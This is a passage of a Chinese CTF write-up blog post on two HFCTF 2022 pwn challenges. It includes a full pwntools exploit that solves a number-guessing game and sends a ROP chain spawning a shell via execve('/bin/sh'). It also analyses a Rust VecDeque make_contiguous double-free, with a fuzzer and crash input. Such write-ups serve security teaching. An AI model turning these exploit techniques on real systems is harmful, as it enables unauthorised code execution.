+<p>math_init有点长，运行程序之后发现是一个1a2b的游戏，当游戏通关在exit之后有一个栈溢出，放的有点隐晦，难受（从头看到尾</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/10.png"></p>
+<p>可以读入0x800个数据，而空间只有0x460，所以存在一个栈溢出。找到漏洞就好办了，接下来就是利用断路，因为这个漏洞点在游戏通过之后所以肯定要先要将游戏通过。直接去网上找了一个通过1a2b的python脚本</p>
+<p>接下来就是到达漏洞点，利用rdi rax rdx rsi这些寄存器来执行getshell需要的条件，这里还有一个坑点没有pop rdi这个gadget。。。所以需要借助其它的gadget来使得rdi = ‘/bin/sh’</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guessTrainner</span>():</span><br><span class="line">   start =time.time()</span><br><span class="line">   answerSet=answerSetInit(<span class="built_in">set</span>())</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">      inputStrMax=suggestedNum(answerSet,<span class="number">100</span>)</span><br><span class="line">      li(<span class="string">'第%d步----'</span> %(i+<span class="number">1</span>))</span><br><span class="line">      li(<span class="string">'尝试：'</span> +inputStrMax)</span><br><span class="line">      li(<span class="string">'----'</span>)</span><br><span class="line">      AMax,BMax = compareAnswer(inputStrMax)</span><br><span class="line">      li(<span class="string">'反馈：%dA%dB'</span> % (AMax, BMax))</span><br><span class="line">      li(<span class="string">'----'</span>)</span><br><span class="line">      ll(<span class="string">'排除可能答案：%d个'</span> % (answerSetDelNum(answerSet,inputStrMax,AMax,BMax)))</span><br><span class="line">      answerSetUpd(answerSet,inputStrMax,AMax,BMax)</span><br><span class="line">      <span class="keyword">if</span> AMax==<span class="number">4</span>:</span><br><span class="line">         elapsed = (time.time() - start)</span><br><span class="line">         li(<span class="string">"猜数字成功，总用时：%f秒，总步数：%d。"</span> %(elapsed,i+<span class="number">1</span>))</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">elif</span> i==<span class="number">5</span>:</span><br><span class="line">         ll(<span class="string">"猜数字失败！"</span>)</span><br><span class="line">         r.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compareAnswer</span>(<span class="params">inputStr</span>):</span><br><span class="line">   inputStr1 = inputStr[<span class="number">0</span>]+<span class="string">' '</span>+inputStr[<span class="number">1</span>]+<span class="string">' '</span>+inputStr[<span class="number">2</span>]+<span class="string">' '</span>+inputStr[<span class="number">3</span>]</span><br><span class="line">   r.sendline(inputStr1)</span><br><span class="line">   r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"> </span><br><span class="line">   tmp = r.recvuntil(<span class="string">'B'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">   <span class="comment"># print(tmp)</span></span><br><span class="line">   <span class="keyword">if</span> tmp == <span class="string">''</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">4</span>,<span class="number">4</span></span><br><span class="line">   tmp = tmp.split(<span class="string">b"A"</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(tmp[<span class="number">0</span>]) &gt; <span class="number">0</span>:</span><br><span class="line">      A = tmp[<span class="number">0</span>]</span><br><span class="line">      B = tmp[<span class="number">1</span>].split(<span class="string">b'B'</span>)[<span class="number">0</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">int</span>(A),<span class="built_in">int</span>(B)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">4</span>, <span class="number">4</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compareAnswer1</span>(<span class="params">inputStr,answerStr</span>):</span><br><span class="line">   A=<span class="number">0</span></span><br><span class="line">   B=<span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">      <span class="keyword">if</span> inputStr[j]==answerStr[j]:</span><br><span class="line">         A+=<span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> inputStr[j]==answerStr[k]:</span><br><span class="line">               B+=<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> A,B</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">answerSetInit</span>(<span class="params">answerSet</span>):</span><br><span class="line">   answerSet.clear()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1234</span>,<span class="number">9877</span>):</span><br><span class="line">      seti=<span class="built_in">set</span>(<span class="built_in">str</span>(i))</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">len</span>(seti)==<span class="number">4</span> <span class="keyword">and</span> seti.isdisjoint(<span class="built_in">set</span>(<span class="string">'0'</span>)):</span><br><span class="line">         answerSet.add(<span class="built_in">str</span>(i))</span><br><span class="line">   <span class="keyword">return</span> answerSet</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">answerSetUpd</span>(<span class="params">answerSet,inputStr,A,B</span>):</span><br><span class="line">   answerSetCopy=answerSet.copy()</span><br><span class="line">   <span class="keyword">for</span> answerStr <span class="keyword">in</span> answerSetCopy:</span><br><span class="line">      A1,B1=compareAnswer1(inputStr,answerStr)</span><br><span class="line">      <span class="keyword">if</span> A!=A1 <span class="keyword">or</span> B!=B1:</span><br><span class="line">         answerSet.remove(answerStr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">answerSetDelNum</span>(<span class="params">answerSet,inputStr,A,B</span>):</span><br><span class="line">   i=<span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> answerStr <span class="keyword">in</span> answerSet:</span><br><span class="line">      A1, B1 = compareAnswer1(inputStr, answerStr)</span><br><span class="line">      <span class="keyword">if</span> A!=A1 <span class="keyword">or</span> B!=B1:</span><br><span class="line">         i+=<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> i</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">suggestedNum</span>(<span class="params">answerSet,lvl</span>):</span><br><span class="line">   suggestedNum=<span class="string">''</span></span><br><span class="line">   delCountMax=<span class="number">0</span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(answerSet) &gt; lvl:</span><br><span class="line">      suggestedNum = <span class="built_in">list</span>(answerSet)[<span class="number">0</span>]</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">for</span> inputStr <span class="keyword">in</span> answerSet:</span><br><span class="line">         delCount = <span class="number">0</span></span><br><span class="line">         <span class="keyword">for</span> answerStr <span class="keyword">in</span> answerSet:</span><br><span class="line">            A,B = compareAnswer1(inputStr, answerStr)</span><br><span class="line">            delCount += answerSetDelNum(answerSet, inputStr,A,B)</span><br><span class="line">         <span class="keyword">if</span> delCount &gt; delCountMax:</span><br><span class="line">            delCountMax = delCount</span><br><span class="line">            suggestedNum = inputStr</span><br><span class="line">         <span class="keyword">if</span> delCount == delCountMax:</span><br><span class="line">            <span class="keyword">if</span> suggestedNum == <span class="string">''</span> <span class="keyword">or</span> <span class="built_in">int</span>(suggestedNum) &gt; <span class="built_in">int</span>(inputStr):</span><br><span class="line">               suggestedNum = inputStr</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> suggestedNum</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r.sendlineafter(<span class="string">'PLEASE INPUT A NUMBER:'</span>, <span class="string">'1416925456'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'YOU HAVE SEVEN CHANCES TO GUESS'</span>)</span><br><span class="line">    guessTrainner()</span><br><span class="line">    r.sendafter(<span class="string">'AGAIN OR EXIT?\n'</span>, <span class="string">'exit'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'(4) EXIT\n'</span>, <span class="string">'4'</span>)</span><br><span class="line">    pop_rsi_ret = <span class="number">0x000000000041c41c</span></span><br><span class="line">    pop_rdx_ret = <span class="number">0x000000000048546c</span></span><br><span class="line">    pop_rax_ret = <span class="number">0x0000000000405b78</span></span><br><span class="line">    pop_rcx_ret = <span class="number">0x000000000044dbe3</span></span><br><span class="line">    mov_val_rax_rcx_ret = <span class="number">0x000000000042b353</span></span><br><span class="line">    xchg_rax_r9_ret = <span class="number">0x000000000045b367</span></span><br><span class="line">    mov_rdi_r9 = <span class="number">0x0000000000410d24</span></span><br><span class="line">    syscall = <span class="number">0x000000000042c066</span></span><br><span class="line">    <span class="comment"># execve('/bin/sh\x00', 0, 0);</span></span><br><span class="line">    p1 = <span class="string">b'a'</span> * <span class="number">0x460</span> + p64(pop_rax_ret) + p64(<span class="number">0xc00007c000</span>)</span><br><span class="line">    p1 += p64(pop_rcx_ret) + p64(<span class="number">0x68732f6e69622f</span>)</span><br><span class="line">    p1 += p64(mov_val_rax_rcx_ret) + p64(xchg_rax_r9_ret)</span><br><span class="line">    p1 += p64(mov_rdi_r9) + p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    p1 += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">    p1 += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    p1 += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    p1 += p64(syscall)</span><br><span class="line">    r.sendafter(<span class="string">'ARE YOU SURE?\n'</span>, p1)</span><br><span class="line">    r.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ll(<span class="string">'[-] something error, continue!!!'</span>)</span><br><span class="line">    r.close()</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="vdq"><a href="#vdq" class="headerlink" title="vdq"></a>vdq</h1><blockquote>
+<p>第一次做rutst程序，rust反汇编之后，麻了。。参考了<a target="_blank" rel="noopener" href="https://www.cjovi.icu/WP/1617.html">chuj师傅</a></p>
+</blockquote>
+<h2 id="查看保护-2"><a href="#查看保护-2" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/12.png"></p>
+<h2 id="逆向分析-2"><a href="#逆向分析-2" class="headerlink" title="逆向分析"></a>逆向分析</h2><p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/13.png"></p>
+<p>跟进主函数之后第一行应该是hfctf2022的那个界面。vdq::banner::hdbaa6696562a9ae9，vdq是程序名，banner是函数名。</p>
+<p><code>get_opr_lst</code>应该就是read的功能了。跟进这个函数发现了一个变量</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">core::result::Result&lt;alloc::vec::Vec&lt;vdq::Operation&gt;,serde_json::error::Error&gt; v29; // [rsp+190h] [rbp-38h] BYREF</span><br></pre></td></tr></tbody></table></figure>
+
+<p>操作输入后反序列化到这里<code>serde_json</code>应该可以猜测出来是反序列化了。</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/15.png"></p>
+<p>接着看到这里，应该有增加功能，追加功能等。</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/16.png"></p>
+<p>拿一个功能来看的时候发现错误了，结果报错的时候将反序化的格式都回显出来了，如 [“Add”, “Add”, “Remove”]，然后起一新行以 ‘$’ 结尾</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/17.png"></p>
+<p>在enum这里也可以看到</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/18.png"></p>
+<p>由此知道有五种操作。</p>
+<blockquote>
+<h5 id="Add"><a href="#Add" class="headerlink" title="Add"></a>Add</h5><p>添加一条信息，加入队尾</p>
+<h5 id="Remove"><a href="#Remove" class="headerlink" title="Remove"></a>Remove</h5><p>删除一条信息，从队头删除</p>
+<h5 id="Append"><a href="#Append" class="headerlink" title="Append"></a>Append</h5><p>向当前队头的信息中添加额外的信息进行拼接</p>
+<h5 id="Archive"><a href="#Archive" class="headerlink" title="Archive"></a>Archive</h5><p>与Remove相似</p>
+<h5 id="View"><a href="#View" class="headerlink" title="View"></a>View</h5><p>打印当前所有的信息</p>
+</blockquote>
+<p>archive这个功能并不会将用以储存消息的容器也释放掉</p>
+<p>接下来用chuj的fuzz测一下</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fuzz.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> ((1))</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    python ./vdq_input_gen.py &gt; poc</span><br><span class="line">    <span class="built_in">cat</span> poc | ./vdq</span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vdq_input_gen.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">operations = <span class="string">"["</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">"\"Add\", "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Remove</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">"\"Remove\", "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Append</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">"\"Append\", "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">View</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">"\"View\", "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Archive</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">"\"Archive\", "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DoOperations</span>():</span><br><span class="line">    <span class="built_in">print</span>(operations[:-<span class="number">2</span>] + <span class="string">"]"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"$"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DoAdd</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DoAppend</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">total_ops = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">total_adds = <span class="number">0</span></span><br><span class="line">total_append = <span class="number">0</span></span><br><span class="line">total_remove = <span class="number">0</span></span><br><span class="line">total_message = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total_ops):</span><br><span class="line">    op = random.randint(<span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">0</span>:</span><br><span class="line">        total_message += <span class="number">1</span></span><br><span class="line">        total_adds += <span class="number">1</span></span><br><span class="line">        Add()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">1</span>:</span><br><span class="line">        total_adds -= <span class="number">1</span></span><br><span class="line">        Remove()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> total_adds &gt; <span class="number">0</span>:</span><br><span class="line">            total_append += <span class="number">1</span></span><br><span class="line">            total_message += <span class="number">1</span></span><br><span class="line">            Append()</span><br><span class="line">        Append()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">3</span>:</span><br><span class="line">        total_adds = <span class="number">0</span></span><br><span class="line">        total_append = <span class="number">0</span></span><br><span class="line">        total_remove = <span class="number">0</span></span><br><span class="line">        Archive()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">4</span>:</span><br><span class="line">        View()</span><br><span class="line">DoOperations()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total_message):</span><br><span class="line">    DoAdd(<span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, random.randint(<span class="number">1</span>, <span class="number">40</span>))))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>很快就出了crash。double free。</p>
+<p>poc有点长</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">["View", "Archive", "View", "View", "Archive", "View", "Remove", "Add", "Archive", "View", "Append", "Append", "View", "Add", "Add", "Add", "Remove", "Add", "View", "View", "Remove", "Remove", "View", "Append", "Append", "Add", "Remove", "Archive", "Append"]</span><br><span class="line">$</span><br><span class="line">2Ah7DGlQ</span><br><span class="line">4qGYTiUPOxy51oQpu9MHRwIm8LJvZCW</span><br><span class="line">wkOQE9VLM3mZfYJS85i4pln7</span><br><span class="line">cm95ws3eQ7pIGnDZTWCqlrgMf</span><br><span class="line">oZLAyx17cWswezaKJqQvHDEkin3YpCg4</span><br><span class="line">kNOZmpAHrvzt7MGW1</span><br><span class="line">EB3T4Yv5wyPJs</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对poc简化一下</p>
+<p><code>["Add", "Add", "Archive", "Add", "Archive", "Add", "Add",  "View", "Remove", "Remove", "Archive"] </code></p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/19.png"></p>
+<p>在简化的时候发现一个看起来无用的功能去掉之后不会触发crash了</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/20.png"></p>
+<p>跟进view功能看一下</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/21.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pub struct VecDeque&lt;T, A: Allocator = Global&gt; { /* private fields */ }</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>A double-ended queue implemented with a growable ring buffer.</p>
+<p>The “default” usage of this type as a queue is to use <a target="_blank" rel="noopener" href="https://doc.rust-lang.org/alloc/collections/vec_deque/struct.VecDeque.html#method.push_back"><code>push_back</code></a> to add to the queue, and <a target="_blank" rel="noopener" href="https://doc.rust-lang.org/alloc/collections/vec_deque/struct.VecDeque.html#method.pop_front"><code>pop_front</code></a> to remove from the queue. <a target="_blank" rel="noopener" href="https://doc.rust-lang.org/alloc/collections/vec_deque/struct.VecDeque.html#method.extend"><code>extend</code></a> and <a target="_blank" rel="noopener" href="https://doc.rust-lang.org/alloc/collections/vec_deque/struct.VecDeque.html#method.append"><code>append</code></a> push onto the back in this manner, and iterating over <code>VecDeque</code> goes front to back.</p>
+<p>A <code>VecDeque</code> with a known list of items can be initialized from an array:</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use std::collections::VecDeque;</span><br><span class="line"></span><br><span class="line">let deq = VecDeque::from([-1, 0, 1]);</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>Since <code>VecDeque</code> is a ring buffer, its elements are not necessarily contiguous in memory. If you want to access the elements as a single slice, such as for efficient sorting, you can use <a target="_blank" rel="noopener" href="https://doc.rust-lang.org/alloc/collections/vec_deque/struct.VecDeque.html#method.make_contiguous"><code>make_contiguous</code></a>. It rotates the <code>VecDeque</code> so that its elements do not wrap, and returns a mutable slice to the now-contiguous element sequence.</p>
+</blockquote>
+<p><strong>make_contiguous</strong></p>
+<blockquote>
+<p>Rearranges the internal storage of this deque so it is one contiguous slice, which is then returned.</p>
+</blockquote>
+<p>这个 <code>make_contiguous</code> 的 feature 1.48.0 被引入，1.49.0 修复</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/22.png"></p>
+<blockquote>
+<p>VecDeque::make_contiguous 存在一个错误，即在特定条件下多次弹出相同的元素。此错误可能导致释放后使用或双重释放。</p>
+</blockquote>
+<p>我们构造一个payload之后在make_contiguous这里下个断点看一下结构</p>
+<p><code>["Add", "Add", "Archive", "Add", "Archive", "Add", "Add",  "View", "Remove", "Remove", "Remove", "View"]</code></p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/24.png"></p>
+<p>在第二个view时</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/25.png"></p>
+<p>连续指的是 buf 连续，也就是 buf 可以线性遍历（简单的说就是把循环队列转换为线性数组）。这里转换完成后，tail 变成 1，head 变成 4，即可返回一个可用的切片了。</p>
+<p><code>return unsafe { &amp;mut self.buffer_as_mut_slice()[tail..head] };</code></p>
+<p>有漏洞的版本可以看到直接返回了一个可用切片，返回一个 plain 的 slice，这样就会加回到头部可以形成double free</p>
+<p>先构造出循环队列，也就是 head &lt; tail，并且让 make_contiguous 后内存中仍能剩余可用的指针，让 make_contiguous 后 <code>head == cap</code>。由此就可以回绕后 remove 来 double free，view 来 leak，append 来 UAF。</p>
+<p>通过 append 方法来 UAF tcache 底部的 chunk 即可任意地址分配</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/5pwU3-DX9-dI14iNIcIbPA">https://mp.weixin.qq.com/s/5pwU3-DX9-dI14iNIcIbPA</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cjovi.icu/WP/1617.html">https://www.cjovi.icu/WP/1617.html</a></p>
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
